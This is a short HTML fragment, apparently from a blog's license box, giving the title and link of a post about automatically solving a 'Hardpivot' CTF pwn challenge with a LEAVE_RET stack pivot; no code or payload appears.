+      <div>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（LEAVE_RET + 回写BSS突破80字节墙）</div>
       <div>https://xyyr-c.github.io/2026/07/07/moe2025-hardpivot-WorkBuddy-auto-pwn/</div>
     </div>
     <div class="license-meta">
